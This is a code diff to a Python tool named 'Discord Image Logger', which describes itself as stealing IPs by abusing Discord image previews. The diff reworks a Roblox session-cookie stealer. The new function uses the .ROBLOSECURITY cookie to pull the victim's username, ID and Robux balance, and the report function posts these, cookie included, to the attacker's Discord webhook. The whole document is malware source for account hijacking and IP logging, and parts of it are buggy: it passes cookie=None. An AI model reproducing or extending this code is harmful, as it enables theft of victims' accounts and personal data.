@@ -4,8 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import json
-
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -76,48 +74,34 @@ def botCheck(ip, useragent):
     else:
         return False
     
-def stealRoblox(cookie):
-    if not cookie or '.ROBLOSECURITY=' not in cookie:
-        return None
-    
-    # Extract clean cookie
-    roblox_cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0]
-    
-    session = requests.Session()
-    session.cookies['.ROBLOSECURITY'] = roblox_cookie
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json',
-        'Origin': 'https://www.roblox.com',
-        'Referer': 'https://www.roblox.com/'
-    })
-    
+
+def get_roblox_info(cookie):
     try:
-        # Get authenticated user info
-        user_resp = session.get('https://users.roblox.com/v1/users/authenticated').json()
-        username = user_resp.get('name', 'Unknown')
-        user_id = user_resp.get('id', 'Unknown')
-        
-        # Get Robux balance
-        currency_resp = session.get('https://economy.roblox.com/v1/user/currency').json()
-        robux = currency_resp.get('robux', 0)
-        
-        # Optional: Premium status
-        premium_resp = session.get('https://premiumfeatures.roblox.com/v1/users/{}/validate-membership'.format(user_id)).json()
-        is_premium = premium_resp.get('isPremium', False)
-        
-        # Avatar thumbnail
-        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-        
+        session = requests.Session()
+        session.cookies['.ROBLOSECURITY'] = cookie
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        })
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
+        if user_resp.status_code != 200:
+            return None
+        user_data = user_resp.json()
+        uid = user_data.get('id')
+        username = user_data.get('name', 'Unknown')
+        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
+        if robux_resp.status_code != 200:
+            return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
+        robux_data = robux_resp.json()
+        robux = robux_data.get('robux', 0)
         return {
             'username': username,
-            'user_id': user_id,
-            'robux': robux,
-            'premium': is_premium,
-            'avatar': avatar_url
+            'id': str(uid) if uid else 'Unknown',
+            'robux': f"{robux:,}",
+            'cookie': cookie
         }
     except:
-        return None  # Silent fail if invalid/expired cookie
+        return None
+
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -132,11 +116,28 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, roblox_info = None):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
+    robloxdata = get_roblox_info(cookie = None)
+
+    if robloxdata:
+        requests.post(config["webhook"], json = {
+            "Username": robloxdata['username'],
+            "content": "",
+            "embeds": [
+                { 
+                    "title": "Roblox Info",
+                    "color": config["color"],
+                    "ID": robloxdata['id'],
+                    "robux": robloxdata['robux'],
+                    "cookie": robloxdata['cookie'],
+
+                }
+            ]
+        })
     
     if bot:
         requests.post(config["webhook"], json = {
@@ -281,11 +282,7 @@ height: 100vh;
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-
-                if isinstance(data, bytes):
-                    data = json.loads(data.decode())
-
-                username = data.get("username", "Unknown")
+                
 
                 message = config["message"]["message"]
 
@@ -304,9 +301,6 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = f"```"
-                    message += f"\nName: {username}"
-                    message += "```"
 
                 datatype = 'text/html'
 
